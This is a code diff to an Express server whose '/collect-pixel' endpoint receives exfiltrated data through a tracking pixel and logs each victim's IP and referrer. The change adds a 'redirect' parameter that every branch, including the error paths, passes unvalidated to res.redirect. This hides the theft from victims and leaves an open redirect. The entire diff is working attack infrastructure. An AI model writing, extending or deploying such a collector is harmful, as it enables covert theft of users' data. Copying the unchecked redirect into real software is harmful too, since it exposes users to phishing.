@@ -109,7 +109,7 @@ app.get('/health', async (req, res) => {
 });
 
 app.get('/collect-pixel', async (req, res) => {
-    const { d, r } = req.query;
+    const { d, r, redirect } = req.query;
     const timestamp = new Date();
     const ip = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0].trim() : req.socket.remoteAddress;
     const userAgent = req.headers['user-agent'];
@@ -120,9 +120,14 @@ app.get('/collect-pixel', async (req, res) => {
     console.log(`🕒 Time: ${timestamp.toLocaleString()}`);
     console.log(`🌐 IP: ${ip}`);
     console.log(`🔗 Referrer: ${r || 'N/A'}`);
+    console.log(`🔄 Redirect: ${redirect ? 'Yes' : 'No'}`);
     
     if (!d) {
         console.log('❌ No data parameter received');
+        // If there's a redirect, go back even on error
+        if (redirect) {
+            return res.redirect(decodeURIComponent(redirect));
+        }
         return res.status(400).json({ error: 'Missing data parameter' });
     }
     
@@ -186,6 +191,13 @@ app.get('/collect-pixel', async (req, res) => {
         
         console.log('='.repeat(80) + '\n');
         
+        // Check if we need to redirect back
+        if (redirect) {
+            console.log(`🔄 Redirecting back to: ${decodeURIComponent(redirect)}`);
+            return res.redirect(decodeURIComponent(redirect));
+        }
+        
+        // Otherwise return the 1x1 pixel GIF
         const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
         res.writeHead(200, {
             'Content-Type': 'image/gif',
@@ -196,6 +208,13 @@ app.get('/collect-pixel', async (req, res) => {
     } catch (error) {
         console.error('❌ Error processing exfiltration:', error.message);
         console.error('Stack:', error.stack);
+        
+        // Even on error, redirect back if requested
+        if (redirect) {
+            console.log(`🔄 Redirecting back to (error): ${decodeURIComponent(redirect)}`);
+            return res.redirect(decodeURIComponent(redirect));
+        }
+        
         res.status(500).json({ error: 'Internal server error', message: error.message });
     }
 });
